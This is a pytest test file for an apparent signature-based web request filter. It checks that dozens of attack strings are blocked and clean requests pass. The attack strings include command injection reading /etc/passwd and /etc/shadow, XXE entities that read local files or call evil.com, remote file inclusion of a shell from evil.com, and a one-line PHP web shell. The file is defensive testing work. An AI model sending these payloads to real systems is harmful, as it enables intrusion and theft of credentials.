import pytest
from datetime import datetime
from models.request import RequestMetadata, Decision, ThreatLevel
from strategies.signature import SignatureStrategy


@pytest.fixture
def strategy():
    return SignatureStrategy()


def req(path="", query="", body=""):
    return RequestMetadata(
        method="GET" if not body else "POST",
        path=path,
        query_string=query,
        headers={"Content-Type": "application/json"},
        body_preview=body,
        source_ip="10.0.0.1",
        timestamp=datetime.utcnow()
    )


class TestDOMXSSSourcePatterns:
    @pytest.mark.asyncio
    async def test_document_url_source(self, strategy):
        r = await strategy.evaluate(req(query="redir=document.URL"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_source_document" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_location_search_source(self, strategy):
        r = await strategy.evaluate(req(query="input=location.search"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_source_location" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_window_name_source(self, strategy):
        r = await strategy.evaluate(req(body="var x = window.name"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_source_window_name" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_localstorage_source(self, strategy):
        r = await strategy.evaluate(req(body="localStorage.getItem('key')"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_storage_manipulation" in p for p in r.matched_patterns)


class TestDOMXSSSinkPatterns:
    @pytest.mark.asyncio
    async def test_document_write_sink(self, strategy):
        r = await strategy.evaluate(req(body="document.write(userInput)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_document_write" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_innerhtml_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.innerHTML = data"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_innerHTML" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_outerhtml_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.outerHTML = data"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_outerHTML" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_insertAdjacentHTML_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.insertAdjacentHTML('beforeend', html)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_insertAdjacentHTML" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_setAttribute_onclick_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.setAttribute('onclick', 'alert(1)')"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_setAttribute" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_js_protocol_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.href = 'javascript:void(0)'"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_js_protocol" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_eval_sink(self, strategy):
        r = await strategy.evaluate(req(body="eval(userInput)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_eval" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_createContextualFragment_sink(self, strategy):
        r = await strategy.evaluate(req(body="range.createContextualFragment(html)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_createContextualFragment" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_srcdoc_sink(self, strategy):
        r = await strategy.evaluate(req(body="domElem.srcdoc = userInput"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_srcdoc" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_event_handler_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.onevent = 'alert(1)'"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_event_handler" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_backgroundImage_js_sink(self, strategy):
        r = await strategy.evaluate(req(body="el.style.backgroundImage = 'url(javascript:alert(1))'"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_sink_backgroundImage" in p for p in r.matched_patterns)


class TestDOMXSSXhrAndjQuery:
    @pytest.mark.asyncio
    async def test_xhr_manipulation(self, strategy):
        r = await strategy.evaluate(req(body="XMLHttpRequest.open('GET', url)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_xhr_manipulation" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_jquery_ajax_sink(self, strategy):
        r = await strategy.evaluate(req(body="$.ajax({url: maliciousUrl})"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_jquery_sinks" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_jquery_parsehtml(self, strategy):
        r = await strategy.evaluate(req(body="$.parseHTML(userInput)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_jquery_sinks" in p for p in r.matched_patterns)


class TestDOMClobbering:
    @pytest.mark.asyncio
    async def test_iframe_name_clobbering(self, strategy):
        r = await strategy.evaluate(req(body="<iframe name='myFrame'>"))
        assert r.decision == Decision.BLOCK
        assert any("dom_clobbering" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_window_open_clobbering(self, strategy):
        r = await strategy.evaluate(req(body="window.open(url, 'targetName')"))
        assert r.decision == Decision.BLOCK
        assert any("dom_clobbering" in p for p in r.matched_patterns)


class TestDOMXSSDoSAndOther:
    @pytest.mark.asyncio
    async def test_regex_dos(self, strategy):
        r = await strategy.evaluate(req(body="new RegExp('userPattern')"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_dos_regex" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_json_injection(self, strategy):
        r = await strategy.evaluate(req(body="JSON.parse(untrustedData)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_json_injection" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_websocket_poisoning(self, strategy):
        r = await strategy.evaluate(req(body="new WebSocket('wss://evil.com')"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_websocket_poisoning" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_history_manipulation(self, strategy):
        r = await strategy.evaluate(req(body="history.pushState({}, '', maliciousUrl)"))
        assert r.decision == Decision.BLOCK
        assert any("dom_xss_history_manipulation" in p for p in r.matched_patterns)


class TestSSTIPatterns:
    @pytest.mark.asyncio
    async def test_jinja2_template(self, strategy):
        r = await strategy.evaluate(req(query="name={{user}}"))
        assert r.decision == Decision.BLOCK
        assert any("ssti_jinja2" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_python_internals(self, strategy):
        r = await strategy.evaluate(req(query="t={{config.__class__.__init__.__globals__}}"))
        assert r.decision == Decision.BLOCK
        assert any("ssti_python_internals" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_jinja2_block(self, strategy):
        r = await strategy.evaluate(req(body="{% for item in items %}"))
        assert r.decision == Decision.BLOCK
        assert any("ssti_jinja2_block" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_erb_asp_template(self, strategy):
        r = await strategy.evaluate(req(body="<%= system('ls') %>"))
        assert r.decision == Decision.BLOCK
        assert any("ssti_erb_asp" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_velocity_template(self, strategy):
        r = await strategy.evaluate(req(body="#set($var = 'value')"))
        assert r.decision == Decision.BLOCK
        assert any("ssti_velocity" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_freemarker_template(self, strategy):
        r = await strategy.evaluate(req(body="${user.name}"))
        assert r.decision == Decision.BLOCK
        assert any("ssti" in p for p in r.matched_patterns)


class TestSSIPatterns:
    @pytest.mark.asyncio
    async def test_ssi_exec(self, strategy):
        r = await strategy.evaluate(req(query="<!--#exec cmd=\"ls\"-->"))
        assert r.decision == Decision.BLOCK
        assert any("ssi_exec" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_ssi_include(self, strategy):
        r = await strategy.evaluate(req(query="<!--#include file=\"/etc/passwd\"-->"))
        assert r.decision == Decision.BLOCK
        assert any("ssi_include" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_ssi_echo(self, strategy):
        r = await strategy.evaluate(req(query="<!--#echo var=\"DATE_LOCAL\"-->"))
        assert r.decision == Decision.BLOCK
        assert any("ssi_echo" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_ssi_printenv(self, strategy):
        r = await strategy.evaluate(req(query="<!--#printenv"))
        assert r.decision == Decision.BLOCK
        assert any("ssi_printenv" in p for p in r.matched_patterns)


class TestXXEPatterns:
    @pytest.mark.asyncio
    async def test_xxe_doctype(self, strategy):
        r = await strategy.evaluate(req(body="<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"))
        assert r.decision == Decision.BLOCK
        assert any("xxe_doctype" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_xxe_entity_system(self, strategy):
        r = await strategy.evaluate(req(body="<!ENTITY xxe SYSTEM 'http://evil.com'>"))
        assert r.decision == Decision.BLOCK
        assert any("xxe_entity_system" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_xxe_file_access(self, strategy):
        r = await strategy.evaluate(req(body="<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"))
        assert r.decision == Decision.BLOCK
        assert any("xxe_file_access" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_xxe_http_access(self, strategy):
        r = await strategy.evaluate(req(body="<!ENTITY xxe SYSTEM 'http://evil.com/steal'>"))
        assert r.decision == Decision.BLOCK
        assert any("xxe_http_access" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_xxe_php_filter(self, strategy):
        r = await strategy.evaluate(req(body="<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>"))
        assert r.decision == Decision.BLOCK
        assert any("xxe_php_filter" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_xxe_data_access(self, strategy):
        r = await strategy.evaluate(req(body="<!ENTITY xxe SYSTEM 'data://text/plain;base64,PHNjcmlwdD4='>"))
        assert r.decision == Decision.BLOCK
        assert any("xxe_data_access" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_xml_content_type(self, strategy):
        r = await strategy.evaluate(req(body="Content-Type: application/xml"))
        assert r.decision == Decision.BLOCK
        assert any("xml_content_type" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_soap_envelope(self, strategy):
        r = await strategy.evaluate(req(body="<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\">"))
        assert r.decision == Decision.BLOCK
        assert any("soap_envelope" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_svg_namespace(self, strategy):
        r = await strategy.evaluate(req(body="<svg xmlns=\"http://www.w3.org/2000/svg\">"))
        assert r.decision == Decision.BLOCK
        assert any("svg_namespace" in p for p in r.matched_patterns)


class TestCommandInjectionPatterns:
    @pytest.mark.asyncio
    async def test_direct_command(self, strategy):
        r = await strategy.evaluate(req(query="host=;cat /etc/passwd"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_direct" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_pipe_command(self, strategy):
        r = await strategy.evaluate(req(body="cmd=ls|whoami"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_pipe" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_backtick_command(self, strategy):
        r = await strategy.evaluate(req(body="result=`whoami`"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_backtick" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_subshell_command(self, strategy):
        r = await strategy.evaluate(req(body="result=$(cat /etc/passwd)"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_subshell" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_and_command(self, strategy):
        r = await strategy.evaluate(req(query="file=test&&cat /etc/shadow"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_and" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_shell_path(self, strategy):
        r = await strategy.evaluate(req(query="shell=/bin/bash"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_shell" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_windows_command(self, strategy):
        r = await strategy.evaluate(req(body="cmd=cmd.exe /c dir"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_windows" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_recon_command(self, strategy):
        r = await strategy.evaluate(req(query="cmd=systeminfo"))
        assert r.decision == Decision.BLOCK
        assert any("command_injection_recon" in p for p in r.matched_patterns)


class TestFileInclusionPatterns:
    @pytest.mark.asyncio
    async def test_path_traversal(self, strategy):
        r = await strategy.evaluate(req(query="file=../../../etc/passwd"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_traversal" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_encoded_traversal(self, strategy):
        r = await strategy.evaluate(req(query="file=%2e%2e%2fetc/passwd"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_encoded" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_linux_sensitive_file(self, strategy):
        r = await strategy.evaluate(req(query="file=/etc/shadow"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_linux" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_windows_sensitive_file(self, strategy):
        r = await strategy.evaluate(req(query="file=C:\\Windows\\boot.ini"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_windows" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_php_wrapper(self, strategy):
        r = await strategy.evaluate(req(query="page=php://filter/convert.base64-encode/resource=config"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_php_wrappers" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_rfi_protocol(self, strategy):
        r = await strategy.evaluate(req(query="page=http://evil.com/shell.txt"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_rfi" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_proc_self_environ(self, strategy):
        r = await strategy.evaluate(req(query="file=/proc/self/environ"))
        assert r.decision == Decision.BLOCK
        assert any("file_inclusion_proc" in p for p in r.matched_patterns)


class TestFileUploadPatterns:
    @pytest.mark.asyncio
    async def test_multipart_upload(self, strategy):
        r = await strategy.evaluate(req(body="Content-Disposition: form-data; filename=\"test.txt\""))
        assert r.decision == Decision.BLOCK
        assert any("file_upload_multipart" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_executable_extension(self, strategy):
        r = await strategy.evaluate(req(body="filename=\"shell.php\""))
        assert r.decision == Decision.BLOCK
        assert any("file_upload_executable_extension" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_php_content_type(self, strategy):
        r = await strategy.evaluate(req(body="Content-Type: application/x-httpd-php"))
        assert r.decision == Decision.BLOCK
        assert any("file_upload_php_content_type" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_shebang(self, strategy):
        r = await strategy.evaluate(req(body="#!/usr/bin/python"))
        assert r.decision == Decision.BLOCK
        assert any("file_upload_shebang" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_code_injection(self, strategy):
        r = await strategy.evaluate(req(body="<?php system($_GET['cmd']); ?>"))
        assert r.decision == Decision.BLOCK
        assert any("file_upload_code_injection" in p for p in r.matched_patterns)

    @pytest.mark.asyncio
    async def test_null_byte(self, strategy):
        r = await strategy.evaluate(req(body="filename=\"shell.php%00.jpg\""))
        assert r.decision == Decision.BLOCK
        assert any("file_upload" in p for p in r.matched_patterns)


class TestCleanRequest:
    @pytest.mark.asyncio
    async def test_normal_get(self, strategy):
        r = await strategy.evaluate(req(path="/api/users", query="page=1&limit=20"))
        assert r.decision == Decision.ALLOW
        assert len(r.matched_patterns) == 0

    @pytest.mark.asyncio
    async def test_normal_post(self, strategy):
        r = await strategy.evaluate(req(path="/api/login", body="username=john&password=secret"))
        assert r.decision == Decision.ALLOW
        assert len(r.matched_patterns) == 0

    @pytest.mark.asyncio
    async def test_static_file(self, strategy):
        r = await strategy.evaluate(req(path="/static/css/main.css"))
        assert r.decision == Decision.ALLOW
        assert len(r.matched_patterns) == 0

    @pytest.mark.asyncio
    async def test_api_json(self, strategy):
        r = await strategy.evaluate(req(path="/api/data", body='{"key": "value", "count": 42}'))
        assert r.decision == Decision.ALLOW
        assert len(r.matched_patterns) == 0


class TestMultiplePatternDetection:
    @pytest.mark.asyncio
    async def test_detects_multiple_patterns(self, strategy):
        r = await strategy.evaluate(req(
            query="file=../../../etc/passwd",
            body="Content-Disposition: form-data; filename=\"shell.php\"\n<?php system($_GET['cmd']); ?>"
        ))
        assert r.decision == Decision.BLOCK
        assert len(r.matched_patterns) >= 2

    @pytest.mark.asyncio
    async def test_threat_level_highest(self, strategy):
        r = await strategy.evaluate(req(body="<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"))
        assert r.threat_level == ThreatLevel.CRITICAL

    @pytest.mark.asyncio
    async def test_confidence_scales_with_patterns(self, strategy):
        r1 = await strategy.evaluate(req(query="file=../../../etc/passwd"))
        r2 = await strategy.evaluate(req(
            query="file=../../../etc/passwd",
            body="#!/usr/bin/python\nContent-Disposition: form-data; filename=\"shell.php\""
        ))
        assert r2.confidence >= r1.confidence
